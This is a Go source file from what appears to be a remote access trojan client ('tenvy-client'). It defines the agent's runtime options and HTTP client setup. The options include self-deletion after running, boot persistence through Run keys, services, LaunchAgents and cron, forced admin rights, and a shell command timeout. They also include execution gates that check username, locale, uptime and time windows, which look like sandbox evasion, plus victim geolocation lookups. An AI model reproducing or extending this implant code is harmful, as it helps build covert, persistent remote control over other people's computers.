package agent

import (
	"crypto/tls"
	"errors"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	geolocationmgr "github.com/rootbay/tenvy-client/internal/modules/misc/geolocation"
	"github.com/rootbay/tenvy-client/internal/modules/misc/geolocation/providers"
	"github.com/rootbay/tenvy-client/internal/protocol"
)

const (
	statusOnline  = "online"
	statusOffline = "offline"

	defaultPollInterval    = 5 * time.Second
	defaultBackoff         = 30 * time.Second
	defaultShellTimeout    = 30 * time.Second
	defaultResultRetention = 1024
	defaultHotResultCache  = 50
)

type RuntimeOptions struct {
	Logger            *log.Logger
	HTTPClient        *http.Client
	ServerURL         string
	SharedSecret      string
	Preferences       BuildPreferences
	Metadata          protocol.AgentMetadata
	BuildVersion      string
	UserAgentOverride string
	UserAgent         UserAgentOptions
	ShutdownGrace     time.Duration
	TimingOverride    TimingOverride
	ResultStore       ResultStoreOptions
	Watchdog          WatchdogConfig
	Execution         ExecutionGates
	CustomHeaders     []CustomHeader
	CustomCookies     []CustomCookie
	EnabledModules    []string
	Geolocation       geolocationmgr.Config
	CommandSecret     string
	CommandPublicKey  string
}

type TimingOverride struct {
	PollInterval time.Duration
	MaxBackoff   time.Duration
	ShellTimeout time.Duration
}

type WatchdogConfig struct {
	Enabled  bool
	Interval time.Duration
}

type ExecutionGates struct {
	Enabled          bool
	Delay            time.Duration
	MinUptime        time.Duration
	AllowedUsernames []string
	AllowedLocales   []string
	RequireInternet  bool
	StartAfter       *time.Time
	EndBefore        *time.Time
}

type CustomHeader struct {
	Key   string
	Value string
}

type CustomCookie struct {
	Name  string
	Value string
}

type BuildPreferences struct {
	InstallPath   string
	MeltAfterRun  bool
	StartupOnBoot bool
	MutexKey      string
	ForceAdmin    bool
	Persistence   PersistenceBranding
	UserAgent     UserAgentPreference
}

type UserAgentOptions struct {
	Fingerprint string
	DisableAuto bool
}

type UserAgentPreference struct {
	Fingerprint string
	DisableAuto bool
}

type PersistenceBranding struct {
	RunKeyName         string
	ServiceName        string
	ServiceDescription string
	LaunchAgentLabel   string
	CronFilename       string
	BaseDataDir        string
}

func (p BuildPreferences) persistenceBranding() PersistenceBranding {
	branding := p.Persistence
	if strings.TrimSpace(branding.RunKeyName) == "" {
		branding.RunKeyName = "TenvyAgent"
	}
	if strings.TrimSpace(branding.ServiceName) == "" {
		branding.ServiceName = "tenvy-agent.service"
	}
	if strings.TrimSpace(branding.ServiceDescription) == "" {
		branding.ServiceDescription = "Tenvy Agent"
	}
	if strings.TrimSpace(branding.LaunchAgentLabel) == "" {
		branding.LaunchAgentLabel = "com.tenvy.agent"
	}
	if strings.TrimSpace(branding.CronFilename) == "" {
		branding.CronFilename = "tenvy-agent.cron"
	}
	branding.BaseDataDir = strings.TrimSpace(branding.BaseDataDir)
	return branding
}

func (p PersistenceBranding) baseDirectory() string {
	dir := strings.TrimSpace(p.BaseDataDir)
	if dir == "" {
		if runtime.GOOS == "windows" {
			dir = filepath.Join("AppData", "Roaming", "Tenvy")
		} else {
			dir = filepath.Join(".config", "tenvy")
		}
	}

	if filepath.IsAbs(dir) {
		return dir
	}

	if home, err := os.UserHomeDir(); err == nil && strings.TrimSpace(home) != "" {
		return filepath.Join(home, dir)
	}

	return filepath.Join(os.TempDir(), dir)
}

func dataDirectory(pref BuildPreferences) string {
	return pref.persistenceBranding().baseDirectory()
}

type ResultStoreOptions struct {
	Path      string
	Retention int
	HotCache  int
}

func (o *ResultStoreOptions) ensureDefaults(pref BuildPreferences) {
	if strings.TrimSpace(o.Path) == "" {
		o.Path = defaultResultStorePath(pref)
	}
	if o.Retention <= 0 {
		o.Retention = defaultResultRetention
	}
	if o.HotCache <= 0 {
		o.HotCache = defaultHotResultCache
	}
}

func defaultScriptDirectory(pref BuildPreferences) string {
	base := defaultResultStorePath(pref)
	parent := filepath.Dir(base)
	if parent == "" || parent == "." {
		parent = base
	}
	return filepath.Join(parent, "scripts")
}

func (o RuntimeOptions) Validate() error {
	if o.Logger == nil {
		return errors.New("runtime options missing logger")
	}
	if o.HTTPClient == nil {
		return errors.New("runtime options missing http client")
	}
	if strings.TrimSpace(o.ServerURL) == "" {
		return errors.New("runtime options missing server url")
	}
	if strings.TrimSpace(o.BuildVersion) == "" {
		return errors.New("runtime options missing build version")
	}
	return nil
}

func (o *RuntimeOptions) ensureDefaults() {
	o.HTTPClient = ensureHTTPClient(o.HTTPClient)
	if o.ShutdownGrace <= 0 {
		o.ShutdownGrace = 5 * time.Second
	}
	o.ResultStore.ensureDefaults(o.Preferences)
	if o.Watchdog.Enabled && o.Watchdog.Interval <= 0 {
		o.Watchdog.Interval = time.Minute
	}
}

func (o RuntimeOptions) userAgentFingerprint() string {
	if fp := strings.TrimSpace(o.UserAgent.Fingerprint); fp != "" {
		return fp
	}
	return o.Preferences.UserAgent.Fingerprint
}

func (o RuntimeOptions) userAgentAutogenDisabled() bool {
	if o.UserAgent.DisableAuto {
		return true
	}
	return o.Preferences.UserAgent.DisableAuto
}

func ensureHTTPClient(base *http.Client) *http.Client {
	if base == nil {
		base = &http.Client{}
	} else {
		base = cloneHTTPClient(base)
	}

	if base.Timeout <= 0 {
		base.Timeout = 60 * time.Second
	}

	base.Transport = ensureHTTPTransport(base.Transport)
	base.CheckRedirect = secureRedirectPolicy(base.CheckRedirect)
	return base
}

var errInsecureRedirect = errors.New("redirect to insecure scheme blocked")

func secureRedirectPolicy(next func(*http.Request, []*http.Request) error) func(*http.Request, []*http.Request) error {
	return func(req *http.Request, via []*http.Request) error {
		if err := validateRedirectTarget(req, via); err != nil {
			return err
		}
		if next != nil {
			return next(req, via)
		}
		return nil
	}
}

func validateRedirectTarget(req *http.Request, via []*http.Request) error {
	if req == nil || req.URL == nil {
		return nil
	}

	scheme := strings.ToLower(req.URL.Scheme)
	switch scheme {
	case "", "https", "wss":
		return nil
	default:
		return fmt.Errorf("%w: %s", errInsecureRedirect, scheme)
	}
}

func ensureHTTPTransport(rt http.RoundTripper) http.RoundTripper {
	transport, ok := rt.(*http.Transport)
	switch {
	case ok:
		transport = transport.Clone()
	case rt == nil:
		defaultTransport, ok := http.DefaultTransport.(*http.Transport)
		if !ok {
			return rt
		}
		transport = defaultTransport.Clone()
	default:
		return rt
	}

	if transport.DialContext == nil {
		transport.DialContext = (&net.Dialer{Timeout: 15 * time.Second, KeepAlive: 30 * time.Second}).DialContext
	}
	if transport.MaxIdleConns < 32 {
		transport.MaxIdleConns = 32
	}
	if transport.MaxIdleConnsPerHost < 16 {
		transport.MaxIdleConnsPerHost = 16
	}
	if transport.IdleConnTimeout <= 0 {
		transport.IdleConnTimeout = 90 * time.Second
	}
	if transport.TLSHandshakeTimeout <= 0 {
		transport.TLSHandshakeTimeout = 10 * time.Second
	}
	if transport.ExpectContinueTimeout <= 0 {
		transport.ExpectContinueTimeout = time.Second
	}
	transport.ForceAttemptHTTP2 = true

	if transport.TLSClientConfig == nil {
		transport.TLSClientConfig = &tls.Config{MinVersion: tls.VersionTLS12}
	} else {
		cfg := transport.TLSClientConfig.Clone()
		if cfg.MinVersion < tls.VersionTLS12 {
			cfg.MinVersion = tls.VersionTLS12
		}
		transport.TLSClientConfig = cfg
	}
	return transport
}

func (o *RuntimeOptions) PopulateGeolocationFromEnv() {
	if o.Geolocation.Providers == nil {
		o.Geolocation.Providers = make(map[string]providers.Config)
	}

	if val := strings.TrimSpace(os.Getenv("TENVY_GEO_IPINFO_KEY")); val != "" {
		cfg := o.Geolocation.Providers["ipinfo"]
		cfg.APIKey = val
		o.Geolocation.Providers["ipinfo"] = cfg
	}

	if val := strings.TrimSpace(os.Getenv("TENVY_GEO_MAXMIND_KEY")); val != "" {
		cfg := o.Geolocation.Providers["maxmind"]
		cfg.APIKey = val
		o.Geolocation.Providers["maxmind"] = cfg
	}

	if val := strings.TrimSpace(os.Getenv("TENVY_GEO_DBIP_KEY")); val != "" {
		cfg := o.Geolocation.Providers["db-ip"]
		cfg.APIKey = val
		o.Geolocation.Providers["db-ip"] = cfg
	}

	if val := strings.TrimSpace(os.Getenv("TENVY_GEO_DEFAULT_PROVIDER")); val != "" {
		o.Geolocation.DefaultProvider = val
	}
}

func cloneHTTPClient(base *http.Client) *http.Client {
	if base == nil {
		return &http.Client{}
	}
	clone := *base
	return &clone
}
